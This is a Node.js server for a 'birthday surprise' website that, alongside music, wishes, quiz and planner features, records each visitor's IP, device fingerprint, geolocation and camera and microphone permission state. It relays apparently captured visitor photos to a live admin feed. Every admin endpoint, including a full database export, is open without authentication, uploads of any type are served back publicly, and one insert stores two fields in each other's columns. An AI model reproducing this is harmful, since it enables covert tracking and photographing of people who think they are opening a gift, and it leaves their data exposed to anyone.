const express = require('express');
const multer = require('multer');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const db = require('./db');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const PORT = process.env.PORT || 3000;

const uploadsDir = path.join(__dirname, 'uploads');
const musicDir = path.join(uploadsDir, 'music');
const photosDir = path.join(uploadsDir, 'photos');
fs.mkdirSync(uploadsDir, { recursive: true });
fs.mkdirSync(musicDir, { recursive: true });
fs.mkdirSync(photosDir, { recursive: true });

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use('/uploads', express.static(uploadsDir));

const storage = multer.diskStorage({
  destination: function (_req, file, cb) {
    if (file.fieldname === 'music') cb(null, musicDir);
    else cb(null, photosDir);
  },
  filename: function (_req, file, cb) {
    const ext = path.extname(file.originalname) || '.dat';
    cb(null, `${Date.now()}-${Math.random().toString(16).slice(2)}${ext}`);
  }
});
const upload = multer({ storage, limits: { fileSize: 100 * 1024 * 1024 } });

app.use(express.static(path.join(__dirname, 'public')));

// Track connected visitors
const connectedVisitors = new Map();

io.on('connection', (socket) => {
  console.log('Socket connected:', socket.id);

  socket.on('visitor-joined', (data) => {
    connectedVisitors.set(socket.id, { ...data, joinedAt: Date.now() });
    io.emit('visitor-count', connectedVisitors.size);
    io.emit('admin-activity', { type: 'joined', data, time: Date.now() });
  });

  socket.on('visitor-activity', (data) => {
    const visitor = connectedVisitors.get(socket.id);
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    db.run('INSERT INTO activity_log (visitorId, action, page, details, ip) VALUES (?, ?, ?, ?, ?)',
      [data.visitorId || socket.id, data.action, data.page || '', data.details || '', ip]);
    io.emit('admin-activity', { type: 'activity', data: { ...data, ip }, time: Date.now() });
  });

  socket.on('device-info', (data) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const { visitorId, userAgent, browser, platform, screen, language, timezone, geo, camera, mic } = data;
    db.run(`INSERT INTO devices (visitorId, ip, userAgent, browser, platform, screen, language, timezone, country, city, latitude, longitude, cameraPermission, micPermission, geoPermission)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [visitorId, ip, userAgent, platform, browser, screen, language, timezone,
       geo?.country || null, geo?.city || null, geo?.lat || null, geo?.lng || null,
       camera || 'prompt', mic || 'prompt', geo ? 'granted' : 'prompt']);
    io.emit('admin-device', { visitorId, ip, ...data, time: Date.now() });
  });

  socket.on('photo-captured', (data) => {
    io.emit('admin-photo', { ...data, time: Date.now() });
  });

  socket.on('disconnect', () => {
    connectedVisitors.delete(socket.id);
    io.emit('visitor-count', connectedVisitors.size);
  });
});

// === Health ===
app.get('/api/health', (_req, res) => {
  res.json({ status: 'ok', visitors: connectedVisitors.size, time: new Date().toISOString() });
});

// === Visitors ===
app.get('/api/visitors', (_req, res) => {
  db.all('SELECT * FROM visitors ORDER BY id DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/visitor', (req, res) => {
  const { name = '', email = '', note = '', userAgent = '', browser = '', platform = '', screen = '', language = '', ip = '', location = {} } = req.body || {};
  const { country = null, city = null, latitude = null, longitude = null } = location || {};
  db.run('INSERT INTO visitors (name, email, note, userAgent, browser, platform, screen, language, ip, country, city, latitude, longitude) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
    [name, email, note, userAgent, browser, platform, screen, language, ip || req.ip, country, city, latitude, longitude],
    function (err) {
      if (err) return res.status(500).json({ error: err.message });
      res.status(201).json({ success: true, id: this.lastID });
    });
});

// === Devices ===
app.get('/api/devices', (_req, res) => {
  db.all('SELECT * FROM devices ORDER BY id DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/devices', (req, res) => {
  const { visitorId, ip, userAgent, browser, platform, screen, language, timezone, country, city, latitude, longitude, cameraPermission, micPermission, geoPermission } = req.body || {};
  db.run(`INSERT INTO devices (visitorId, ip, userAgent, browser, platform, screen, language, timezone, country, city, latitude, longitude, cameraPermission, micPermission, geoPermission) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [visitorId, ip, userAgent, browser, platform, screen, language, timezone, country, city, latitude, longitude, cameraPermission, micPermission, geoPermission],
    function (err) {
      if (err) return res.status(500).json({ error: err.message });
      res.status(201).json({ success: true, id: this.lastID });
    });
});

// === Captured Photos ===
app.get('/api/captured-photos', (_req, res) => {
  db.all('SELECT * FROM captured_photos ORDER BY id DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/captured-photos', upload.single('photo'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No photo.' });
  const { visitorId = '', source = 'upload' } = req.body || {};
  db.run('INSERT INTO captured_photos (visitorId, fileName, originalName, mimeType, size, source, ip) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [visitorId, req.file.filename, req.file.originalname, req.file.mimetype, req.file.size, source, req.ip],
    function (err) {
      if (err) return res.status(500).json({ error: err.message });
      res.status(201).json({ success: true, id: this.lastID, file: `/uploads/photos/${req.file.filename}` });
    });
});

// === Photos (legacy) ===
app.get('/api/photos', (_req, res) => {
  db.all('SELECT * FROM photos ORDER BY id DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/photo', upload.single('photo'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No photo.' });
  const { latitude = null, longitude = null, deviceInfo = '' } = req.body || {};
  db.run('INSERT INTO photos (fileName, originalName, mimeType, size, ip, latitude, longitude, deviceInfo) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
    [req.file.filename, req.file.originalname, req.file.mimetype, req.file.size, req.ip, latitude, longitude, deviceInfo],
    function (err) {
      if (err) return res.status(500).json({ error: err.message });
      res.status(201).json({ success: true, id: this.lastID, file: `/uploads/photos/${req.file.filename}` });
    });
});

// === Music ===
app.get('/api/music', (_req, res) => {
  db.all('SELECT * FROM music_tracks ORDER BY id DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/music', upload.single('music'), (req, res) => {
  const { title = 'Untitled', artist = '', thumbnail = '', source = 'upload' } = req.body || {};
  if (!req.file && source === 'upload') return res.status(400).json({ error: 'No file.' });
  const filePath = req.file ? `/uploads/music/${req.file.filename}` : '';
  const fileName = req.file ? req.file.filename : '';
  db.run('INSERT INTO music_tracks (title, artist, fileName, filePath, thumbnail, source) VALUES (?, ?, ?, ?, ?, ?)',
    [title, artist, fileName, filePath, thumbnail, source],
    function (err) {
      if (err) return res.status(500).json({ error: err.message });
      res.status(201).json({ success: true, id: this.lastID, filePath });
    });
});

app.put('/api/music/:id', (req, res) => {
  const { title, artist, isActive } = req.body || {};
  const sets = []; const vals = [];
  if (title !== undefined) { sets.push('title=?'); vals.push(title); }
  if (artist !== undefined) { sets.push('artist=?'); vals.push(artist); }
  if (isActive !== undefined) { sets.push('isActive=?'); vals.push(isActive ? 1 : 0); }
  if (sets.length === 0) return res.json({ success: true });
  vals.push(req.params.id);
  db.run(`UPDATE music_tracks SET ${sets.join(',')} WHERE id=?`, vals, function (err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

app.delete('/api/music/:id', (req, res) => {
  db.get('SELECT fileName FROM music_tracks WHERE id=?', [req.params.id], (err, row) => {
    if (row && row.fileName) {
      const fp = path.join(musicDir, row.fileName);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
    }
    db.run('DELETE FROM music_tracks WHERE id=?', [req.params.id], function (err2) {
      if (err2) return res.status(500).json({ error: err2.message });
      res.json({ success: true });
    });
  });
});

// === Activity Log ===
app.get('/api/activity', (_req, res) => {
  db.all('SELECT * FROM activity_log ORDER BY id DESC LIMIT 200', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// === Settings ===
app.get('/api/settings', (_req, res) => {
  db.all('SELECT * FROM site_settings', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    const settings = {};
    (rows || []).forEach(r => { settings[r.settingKey] = r.settingValue; });
    res.json(settings);
  });
});

app.put('/api/settings', (req, res) => {
  const entries = Object.entries(req.body || {});
  if (entries.length === 0) return res.json({ success: true });
  let done = 0;
  entries.forEach(([key, value]) => {
    db.run('INSERT OR REPLACE INTO site_settings (settingKey, settingValue, updatedAt) VALUES (?, ?, CURRENT_TIMESTAMP)',
      [key, String(value)], () => { done++; if (done === entries.length) res.json({ success: true }); });
  });
});

// === Wishes ===
app.get('/api/wishes', (_req, res) => {
  db.all('SELECT * FROM wishes ORDER BY id DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/wishes', (req, res) => {
  const { name = 'Anonymous', message = '' } = req.body || {};
  if (!message.trim()) return res.status(400).json({ error: 'Message required.' });
  db.run('INSERT INTO wishes (name, message) VALUES (?, ?)', [name, message], function (err) {
    if (err) return res.status(500).json({ error: err.message });
    io.emit('admin-activity', { type: 'wish', data: { name, message }, time: Date.now() });
    res.status(201).json({ success: true, id: this.lastID });
  });
});

app.delete('/api/wishes/:id', (req, res) => {
  db.run('DELETE FROM wishes WHERE id=?', [req.params.id], function (err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// === Quiz Scores ===
app.get('/api/quiz-scores', (_req, res) => {
  db.all('SELECT * FROM quiz_scores ORDER BY id DESC LIMIT 50', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/quiz-scores', (req, res) => {
  const { quizType = 'unknown', score = 0, total = 0 } = req.body || {};
  db.run('INSERT INTO quiz_scores (quizType, score, total) VALUES (?, ?, ?)', [quizType, score, total], function (err) {
    if (err) return res.status(500).json({ error: err.message });
    res.status(201).json({ success: true, id: this.lastID });
  });
});

// === Planner ===
app.get('/api/planner', (_req, res) => {
  db.all('SELECT * FROM planner_items ORDER BY isDone ASC, dueDate ASC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/planner', (req, res) => {
  const { title, description = '', dueDate = '', priority = 'medium', category = 'general' } = req.body || {};
  if (!title) return res.status(400).json({ error: 'Title required.' });
  db.run('INSERT INTO planner_items (title, description, dueDate, priority, category) VALUES (?, ?, ?, ?, ?)',
    [title, description, dueDate, priority, category], function (err) {
      if (err) return res.status(500).json({ error: err.message });
      res.status(201).json({ success: true, id: this.lastID });
    });
});

app.put('/api/planner/:id', (req, res) => {
  const { title, description, dueDate, priority, isDone, category } = req.body || {};
  const sets = []; const vals = [];
  if (title !== undefined) { sets.push('title=?'); vals.push(title); }
  if (description !== undefined) { sets.push('description=?'); vals.push(description); }
  if (dueDate !== undefined) { sets.push('dueDate=?'); vals.push(dueDate); }
  if (priority !== undefined) { sets.push('priority=?'); vals.push(priority); }
  if (isDone !== undefined) { sets.push('isDone=?'); vals.push(isDone ? 1 : 0); }
  if (category !== undefined) { sets.push('category=?'); vals.push(category); }
  if (sets.length === 0) return res.json({ success: true });
  vals.push(req.params.id);
  db.run(`UPDATE planner_items SET ${sets.join(',')} WHERE id=?`, vals, function (err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

app.delete('/api/planner/:id', (req, res) => {
  db.run('DELETE FROM planner_items WHERE id=?', [req.params.id], function (err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// === Surprise Config (editable CONFIG from admin) ===
app.get('/api/config', (_req, res) => {
  db.all('SELECT * FROM surprise_config', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    const config = {};
    (rows || []).forEach(r => { config[r.configKey] = r.configValue; });
    res.json(config);
  });
});

app.put('/api/config', (req, res) => {
  const entries = Object.entries(req.body || {});
  let done = 0;
  if (entries.length === 0) return res.json({ success: true });
  entries.forEach(([key, value]) => {
    db.run('INSERT OR REPLACE INTO surprise_config (configKey, configValue, updatedAt) VALUES (?, ?, CURRENT_TIMESTAMP)',
      [key, typeof value === 'string' ? value : JSON.stringify(value)], () => { done++; if (done === entries.length) res.json({ success: true }); });
  });
});

// === Database export ===
app.get('/api/db-export', (_req, res) => {
  const tables = ['visitors', 'photos', 'wishes', 'quiz_scores', 'devices', 'captured_photos', 'music_tracks', 'activity_log', 'site_settings', 'planner_items', 'surprise_config'];
  const result = {};
  let pending = tables.length;
  tables.forEach(t => {
    db.all(`SELECT * FROM ${t}`, (err, rows) => {
      result[t] = rows || [];
      pending--;
      if (pending === 0) res.json(result);
    });
  });
});

app.get('/admin', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('*', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

server.listen(PORT, () => {
  console.log(`Birthday surprise server running at http://localhost:${PORT}`);
  console.log(`Admin panel at http://localhost:${PORT}/admin`);
});
